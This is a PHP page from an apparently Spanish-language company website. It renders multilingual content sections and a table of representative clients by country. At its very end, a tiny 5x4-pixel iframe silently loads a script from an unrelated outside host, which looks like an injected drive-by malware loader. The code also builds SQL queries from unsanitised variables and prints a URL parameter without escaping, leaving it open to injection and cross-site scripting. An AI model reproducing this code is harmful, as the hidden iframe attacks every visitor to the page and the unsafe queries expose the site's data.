<?
	define ('authenticate', false);
	require ('./inc/conf.inc.php');
	$soc=$_SESSION['socio'];
	if(!$lng){
		$lng=$_SESSION['lng'];
	}
	if(!isset($id_sel) || $id_sel<1 ){ $id_sel=-1; }
	
	if( $id_titulo )
	{
		$tit = $db->value('secciones',"id=$id_titulo and lng='$lng'",'titulo');
	}else{
		$tit=$_GET['tit'];
	}
	
	global $prefijo_socio,$socio;

	$cliente['esp']='Cliente';
	$cliente['ing']='Client';
	$cliente['por']='Cliente';
	
	$paises['esp']='País';
	$paises['ing']='Country';
	$paises['por']='Pais';

?>

<link href="estilos<?=$soc?>.css" rel="stylesheet" type="text/css">
<script language="javascript">
//precacheo de imagenes
var bullet1=new Image(9,15);
bullet1.src="images/flechita1.gif";
var bullet2=new Image(9,15);
//bullet2.src="images/bullet<?=$soc?>2.gif";
bullet2.src="images/flechita1.gif";


//////////////////////////////////////////
function opcionover(x){
x.className='linkover2';
x.parentNode.parentNode.firstChild.firstChild.src=bullet2.src;
}
function opcionout(x){
x.className='link2';
x.parentNode.parentNode.firstChild.firstChild.src=bullet1.src;
}

function atras(x){
	formframe.id_sel.value=x
	formframe.submit()

}
var lng='<?=$lng?>';
</script>
</head>
<?
	if($id_sel>-1){
?>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr valign="top">
	<td height="35" colspan="8" align="right" valign="bottom" class="espacio" ><span class="titulos"><?=$tit!='' ? $tit:'&nbsp;' ;?>&nbsp;&nbsp;</span>&nbsp;&nbsp;<span>&nbsp;&nbsp;</span>
	</td>
</tr>
</table>
<?
	$w=$id_sel;
	$db->select('contenidos','*',"id=$w and lng='$lng'");
	if($db->num_rows()>0){
		while($row=$db->fetch_object()){
			$txt[$row->campo]=$row->contenido;
		}
	}
	$links='';
	
?>	
	
<table height="100%" width="100%" border="0" cellpadding="0" cellspacing="0">
<tr valign="top">
<td width="0%" valign="top" height="100%" align="left">
<?
	if( in( $id_sel, 19, 168, 169, 170 ) )
	{
		switch( $id_sel )
		{
			case 6: $where = 'activo=1';  break;
			case 19: $where = 'activo=1'; break; //Asociacion
			case 168: $where = "pais=1"." AND activo=1"; break; //Argentina
			case 169: $where = "pais=2"." AND activo=1"; break; //Brasil
			case 170: $where = "pais=3"." AND activo=1"; break; //Chile
		}
		$clientes = dbi::select( 'clientes_representativos', '*', $where, 'cliente' );
	
		?>
		<style type="text/css">
		<!--
		.style7 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight: bold; font-size: 11px; }
		.style9 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px}
		-->
		</style>
		<table width="100%"  cellspacing="0" cellpadding="2">
			<tr bgcolor="#CCCCCC">
				<td width="624" style="border-top: 1px solid #666666;"><font color="#666666" class="style7"><?=$cliente[$lng]?></font></td>
				<td width="87" style="border-top: 1px solid #666666;"><font color="#666666" class="style7"><?=$paises[$lng]?></font></td>
			</tr>
			<?
			while( $cliente = $clientes->fetch_object() )
			{
				?>
					<tr align="left" valign="top">
						<td class="style9" style="border-top: 1px solid #666666;"><?= $cliente->cliente?></td>
						<td width="87" class="style9" style="border-top: 1px solid #666666;"><img src="images/<?= $cliente->pais == 1 ? 'argentina' : ($cliente->pais == 2 ? 'brasil' : 'chile' ) ?>.gif" border="0" /></td>
					</tr>
				<?
			}
		?>
		</table>
		<?
	}else{
		?>
			<table border="0" cellpadding="1" cellspacing="0" width="95%" align="left">
				<tr><td height="10"></td></tr>
				<tr valign="top">
					<? if( $id_sel != 159 ){ ?>
					<!--<td rowspan="1" class="textosrojos" width="10" nowrap>&bull;</td>
					<td class="textosrojos" width="70" nowrap><?=$txt['CAMPO_titulo']?></td>-->
					<? } ?>
				   <td class="textocontenido"><?=($id_sel == 159  || $id_sel==190  || $id_sel==191 || $id_sel==192) ? $txt['CAMPO_texto'] : nl2br($txt['CAMPO_texto'])?></td>
				</tr>
			</table>
		<?
	}
?>
</td>
</TD></TR></Table>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body></html>

<? } ?>
